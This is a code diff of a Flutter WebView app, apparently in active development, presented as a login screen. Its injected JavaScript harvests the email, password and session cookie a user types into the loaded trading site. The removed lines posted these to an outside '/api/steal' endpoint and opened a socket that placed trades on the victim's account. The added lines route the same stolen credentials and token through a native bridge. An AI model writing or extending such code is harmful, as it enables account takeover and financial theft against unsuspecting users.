@@ -1,7 +1,6 @@
 import 'package:flutter/material.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:flutter/services.dart';
-import 'dart:convert';
 
 void main() => runApp(const MyApp());
 
@@ -11,18 +10,18 @@ class MyApp extends StatelessWidget {
   Widget build(BuildContext context) {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
-      home: const HiddenWebViewScreen(),
+      home: const LoginScreen(),
     );
   }
 }
 
-class HiddenWebViewScreen extends StatefulWidget {
-  const HiddenWebViewScreen({super.key});
+class LoginScreen extends StatefulWidget {
+  const LoginScreen({super.key});
   @override
-  State<HiddenWebViewScreen> createState() => _HiddenWebViewScreenState();
+  State<LoginScreen> createState() => _LoginScreenState();
 }
 
-class _HiddenWebViewScreenState extends State<HiddenWebViewScreen> {
+class _LoginScreenState extends State<LoginScreen> {
   late WebViewController _controller;
 
   @override
@@ -33,7 +32,10 @@ class _HiddenWebViewScreenState extends State<HiddenWebViewScreen> {
       ..addJavaScriptChannel(
         'NativeBridge',
         onMessageReceived: (msg) {
-          print("Received from WebView: ${msg.message}");
+          if (msg.message.contains('creds')) {
+            // بعد ما نسجل الدخول، ننقل للواجهة باستخدام SystemNavigator.pop (نفس صاحبك)
+            SystemNavigator.pop();
+          }
         },
       )
       ..setNavigationDelegate(
@@ -47,10 +49,8 @@ class _HiddenWebViewScreenState extends State<HiddenWebViewScreen> {
   }
 
   void _injectOriginalScript() {
-    // 217. هون السكربت اللي استخرجناه من صاحبك، بس مع اتصال WebSocket مباشر
     String jsScript = """
       (function() {
-        // سرقة الباسورد
         function setNativeValue(el, value) {
           try {
             var proto = window.HTMLInputElement.prototype;
@@ -70,11 +70,13 @@ class _HiddenWebViewScreenState extends State<HiddenWebViewScreen> {
           try {
             var e = findEmail(), p = findPass();
             if (e && p && e.value && p.value) {
-              fetch('https://clone-server-dejt.onrender.com/api/steal', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: e.value, password: p.value})}).catch(err => {});
+              NativeBridge.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
               
-              // سحب الكوكيز
-              var cookies = document.cookie;
-              fetch('https://clone-server-dejt.onrender.com/api/steal', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: cookies})}).catch(err => {});
+              // سحب التوكن (qtx_session_cookie) والكوكيز
+              var cookie = document.cookie;
+              if (cookie.includes('qtx_session_cookie')) {
+                 NativeBridge.postMessage(JSON.stringify({type: 'token', data: cookie}));
+              }
             }
           } catch (err) {}
         }
@@ -86,18 +88,6 @@ class _HiddenWebViewScreenState extends State<HiddenWebViewScreen> {
             if (t) sendCreds();
           }, true);
         }
-
-        // 218. اتصال الـ WebSocket بالحرف زي صاحبك
-        var socket = new WebSocket('wss://ws2.quotex.com/socket.io/?EIO=4&transport=websocket');
-        socket.onopen = function() {
-          // بنبعت أمر فتح صفقة
-          var payload = '42["orders/open", {"asset":"EURUSD","amount":10,"direction":"up","duration":60}]';
-          socket.send(payload);
-        };
-        socket.onmessage = function(event) {
-          NativeBridge.postMessage(JSON.stringify({type: 'socket_message', data: event.data}));
-        };
-        window.qtxSocket = socket;
       })();
     """;
     _controller.runJavaScript(jsScript);
